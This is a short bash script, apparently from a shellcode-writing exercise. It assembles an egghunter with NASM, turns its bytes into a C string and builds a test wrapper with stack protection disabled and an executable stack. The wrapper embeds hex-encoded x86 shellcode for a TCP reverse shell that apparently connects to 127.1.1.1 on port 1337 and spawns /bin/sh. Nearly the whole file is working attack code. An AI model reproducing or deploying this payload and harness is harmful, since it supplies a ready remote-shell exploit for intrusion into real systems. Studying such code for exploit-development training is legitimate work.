#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o -z execstack

egghunter=$(objdump -d $1.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')

echo '[+] Creating C wrapper...'
cat >shellcode-wrapper-$1.c << EOD
	#include<stdio.h>
	#include<string.h>
	unsigned char code[] = \
		"\xde\xad\xbe\xef" // Egg (1st half)
		"\xde\xad\xbe\xef" // Egg (2nd half)
		// TCP reverse shell (see corresponding reverse-tcp.nasm)
		"\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5e"
		"\x96\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53"
		"\x89\xe1\x43\x6a\x10\x51\x56\x89\xe1\xcd\x80\x5b\x6a\x02\x59"
		"\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xd2\x52\x59\x51\x68"
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
	unsigned char egghunter[] = $egghunter;
	int main() {
		printf("Shellcode length: %d\n", strlen(egghunter));
		int (*ret)() = (int(*)()) egghunter;
		ret();
	}
EOD

echo '[+] Compiling C wrapper...'
gcc -ggdb -o shellcode-wrapper-$1 shellcode-wrapper-$1.c -fno-stack-protector -z execstack -m32

echo "[+] Done! Here is your shellcode ($(( ($(echo $egghunter | wc -c) - 2) / 4 )) bytes):"
echo $egghunter
